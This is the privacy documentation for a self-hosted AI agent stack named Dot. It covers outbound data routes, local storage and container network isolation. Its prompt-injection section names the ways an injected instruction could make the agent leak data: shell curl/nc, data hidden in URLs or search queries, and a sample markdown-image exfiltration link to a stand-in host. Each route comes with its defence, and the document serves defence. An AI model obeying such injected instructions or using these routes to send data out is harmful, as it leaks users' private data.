# Privacy

Dot is built so that nothing about you leaves this machine except what you ask the agent to send to the web. This page lists every route out, how to close it, and how to check.

Run `make privacy-check` after every `make up`. It tests the running stack and fails loudly.

## What leaves the machine

| What | When | To whom | Turn it off |
|---|---|---|---|
| Search queries (the text the model puts into `WebSearch`) | The agent calls `WebSearch` | DuckDuckGo, Brave, Wikipedia, GitHub, Stack Overflow, arXiv, through `dot-searxng` (your IP is theirs to see; SearXNG strips nothing a search engine needs) | `DOT_WEB_SEARCH=off` in `.env`, then `make up`. The tool is not registered, the model cannot call it, nothing reaches searxng. To keep search but narrow it, edit `deploy/config/searxng/settings.yml` (`keep_only`). |
| URLs you or the agent fetch (host name, path, query, your IP, a generic `DotAgent/1.0` User-Agent) | The agent calls `WebFetch` | The site in the URL, and the DNS resolver of your host | `DOT_WEB_FETCH=off`. |
| Pages the headless browser visits, everything the page loads (scripts, images, trackers), and anything typed into it | The agent calls `BrowserNavigate`/`BrowserClick`/`BrowserType`, or you drive the Browser tab | The sites visited and every third party those pages load | Do not start the browser: it only runs with `make up-browser`. `make down` stops it. |
| Saved-login submissions (vault) | The agent calls `BrowserLogin` and you approve | The site you saved the login for | Do not save logins; approvals are required every time. |
| Model files (once, at install) | `make models` | The host you set in `DOT_MODEL_URL` or `DOT_MODEL_REPO` (Hugging Face by default) | Copy a GGUF into `models/` by hand. No other target downloads anything. |
| Docker images and npm/PyPI packages (build time only) | `make up` the first time, or a rebuild | Docker Hub, ghcr.io, PyPI, npm | Build once on a trusted connection. Nothing is installed at runtime. |
| Wikipedia contact line | Every Wikipedia search | A generic placeholder (`noreply@example.invalid`), never your address | Remove `wikipedia` from `keep_only`. |

Nothing else leaves: no telemetry, no analytics, no crash reports, no update checks, no fonts or scripts from a CDN, no voice audio, no chats, no files, no tokens. The model runs in `dot-llm` with `LLAMA_ARG_OFFLINE=1` and `HF_HUB_OFFLINE=1`; the voice worker loads local models only.

Honest limits: a search query is data about you and you cannot hide it from the engine that answers it. A page the browser opens can see your IP and run its own scripts. Both are the point of the feature.

## What stays local

- Chats, tool results, the audit log, schedules, MCP approvals: SQLite in the `dot-data` volume, **plaintext**, directory mode 700, files mode 600. Disk encryption is your job (LUKS or encrypted home).
- Long-term memory files: `dot-memory` volume.
- Saved logins and browser sessions: encrypted with `DOT_VAULT_KEY` (see `docs/security.md`, "Credential vault").
- Uploads and attachments: `workspace/uploads/`, plaintext, inside your workspace folder.
- Voice: audio is held in memory for one request and never written to disk, never logged (a test checks this). Transcripts become normal chat text.
- Browser screenshots: not stored.
- `.env` (tokens, vault key): mode 600, git-ignored. Logs mask every token; access logs drop query strings; request bodies and headers are never logged.
- LLM request capture (`DOT_LLM_DEBUG_FILE`) is off by default. When on, it writes full prompts (your chats) to a mode-600 file, scrubbed of known tokens and capped at 5 MB with one rotation. Turn it off again when done.
- Docker keeps container logs in its own json-file store (10 MB x 3 per service). They contain no chat text, but treat them as local data.

## How the network is cut

| Container | Networks | Internet |
|---|---|---|
| `dot-llm` | `dot-core` (internal), `dot-publish` | No. `dot-publish` has no NAT and its DNS points at a dead address. |
| `dot-sandbox` | `dot-sandbox-link` (internal, shared only with the backend) | No. It cannot even resolve the llm, searxng or web names. A shell command cannot send anything anywhere. |
| `dot-web` | `dot-core`, `dot-publish` | No. |
| `dot-voice` | `dot-voice-link` (internal) | No. |
| `dot-backend` | core, sandbox-link, search-link, browser-link, voice-link, publish, `dot-fetch` | Yes, by design, for `WebFetch` only. Every URL passes the SSRF guard (public addresses only, DNS resolved once and pinned, redirects re-checked). |
| `dot-searxng` | `dot-search-link` (internal), `dot-search` | Yes, by design: the search engines. It has no other route and cannot see any other container. |
| `dot-browser` | `dot-browser-link` (internal), `dot-browsing` | Yes, by design: pages. Its Chromium goes through a guarded egress proxy that refuses private, loopback, link-local and metadata addresses. |

Docker cannot publish ports from an internal network, so llm, backend and web also join `dot-publish`, a bridge with IP masquerade off: packets from it are not translated, so no reply can come back. `deploy/scripts/firewall_dot.sh` goes further: it prints host `iptables` rules that stop the egress networks from reaching your LAN and host, and stop `dot-publish` from opening any connection. Read it, then apply it with `--apply` as root yourself. Nothing applies it for you.

Residual: until the firewall script is applied, `dot-backend`, `dot-searxng` and `dot-browser` can reach your LAN at the network level. The backend only does so through the SSRF guard; searxng only talks to its engine list.

## Prompt-injection exfiltration

A hostile page, file or MCP result can tell the model to leak data. The routes and the defences:

| Route | Defence |
|---|---|
| Shell (`curl`, `nc`) in the sandbox | No network at all. Verified by a real connection attempt in `make privacy-check`. |
| `WebFetch` / `BrowserNavigate` with data in the URL | Approval card with the full URL when the URL has a long encoded token, credentials or a long query, or was composed by the model after untrusted content entered the chat. Links that appear in earlier results or in your messages pass without a prompt. |
| `WebSearch` with data in the query | Approval card when the query is long, carries an encoded token, or repeats text from untrusted content. |
| Markdown image (`![x](https://evil/?d=...)`) | Dot's markdown renderer has no images; the text shows as a plain link you must click. The CSP also blocks any remote image. |
| Links | Open only on click, with `rel="noreferrer noopener"`, `Referrer-Policy: no-referrer`. |
| HTML preview of workspace files | Sandboxed iframe, CSP `default-src 'none'`, no forms, no base tag. |
| MCP tools | Every MCP tool asks in all modes except `bypass`; stdio servers run in the sandbox (no network). Remote (HTTP) MCP servers run from the backend and are third parties by definition: add only servers you trust. |
| Web server (`dot-web`) | CSP: `default-src 'self'`, `connect-src 'self'`, `img-src 'self' data: blob:`, `frame-src 'self'`, `form-action 'self'`, `base-uri 'none'`, `object-src 'none'`, no `unsafe-eval`. |

`bypass` mode skips the approval policy by definition. Use it only on disposable workspaces. Not stoppable: a page can list many URLs and the model can pick among them, leaking a few bits per call.

## Verify yourself

- `make privacy-check` (live stack) and `uv run pytest deploy/tests` (static compose invariants).
- `docker exec dot-dot-sandbox-1 python3 -c "import socket;socket.create_connection(('1.1.1.1',443),3)"` must fail.
- `curl -sI http://127.0.0.1:3000/` shows the CSP.
